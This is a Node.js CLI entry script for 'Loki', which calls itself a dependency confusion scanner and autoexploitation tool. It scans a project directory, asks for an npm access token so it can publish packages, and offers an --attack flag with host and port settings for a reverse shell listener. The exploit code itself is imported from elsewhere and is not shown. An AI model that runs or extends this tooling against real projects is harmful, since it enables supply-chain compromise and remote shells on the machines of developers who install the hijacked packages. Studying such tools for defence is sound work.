#!/usr/bin/env node
'use strict'

import { testProject as scan} from "../loki-snync/src/main.js";
import meow from 'meow'
import chalk from 'chalk'
import { setup } from "../src/main.js"
const cli = meow(chalk.rgb(247, 30, 56)(`
  Usage
    $ loki [options]

  Options
    --directory   -d   Path to directory to scan
    --entrypoint  -e   Path to file to execute if directory is vulnerable (defaults to index.js)
    --inspect     -i   Enable inspector mode
    --accesstoken -a   Access token for npmjs.com
    --attack           Whether to attack the project
    --host             Host IP where the reverse shell lister is running (defaults to localhost)
    --port             Port where the reverse shell lister is running (defaults to 1456)
`), {
    importMeta: import.meta,
    description: false,
    flags: {
        directory: {
            type: 'string',
            alias: 'd'
        },
        entrypoint: {
            type: 'string',
            alias: 'e',
            default: 'index.js'
        },
        inspect: {
            type: 'boolean',
            alias: 'i'
        },
        accesstoken: {
            type: 'string',
            alias: 'a'
        },
        attack: {
            type: 'boolean',
        },
        host: {
            type: 'string',
            default: 'localhost'
        },
        port: {
            type: 'number',
            default: 1456
        }
    }
});

function log(message) {
    if (!message) return;
    console.log(chalk.rgb(247, 30, 56)('[Loki]'), message)
}
function greet() {
    console.log(chalk.rgb(247, 30, 56)(`  _____       ___   ___  ____   _____  
 |_   _|    .'   \`.|_  ||_  _| |_   _| 
   | |     /  .-.  \\ | |_/ /     | |   
   | |   _ | |   | | |  __'.     | |   
  _| |__/ |\\  \`-'  /_| |  \\ \\_  _| |_  
 |________| \`.___.'|____||____||_____| 
                                      ` + '\n' + '[X] The Dependency Confusion vulnerability scanner and autoexploitation tool [X]'))
}
async function start() {
    greet()
    const { flags } = cli;
    const { directory, entrypoint, accesstoken, attack, host, port, inspect } = flags;

    if (!directory) {
        console.error(cli.help);
        process.exit(-1);
    }
    if (!accesstoken) {
        console.error('Loki requires an Access Token from npmjs.com to perform the exploitation.')
        console.error('Please create it in https://www.npmjs.com/settings/<username>/tokens/create.')
        process.exit(-1)
    }

    const pkgs = await scan({
        projectPath: directory,
        log,
        debugMode: Boolean(inspect)
    });
    if (Object.keys(pkgs).length === 0) {
        log('No vulnerabilities found');
    } else {
        const shell_data = {
            attack,
            host,
            port
        }
        setup({ pkgs, directory, entrypoint, accesstoken, shell_data })
    }
}

start()
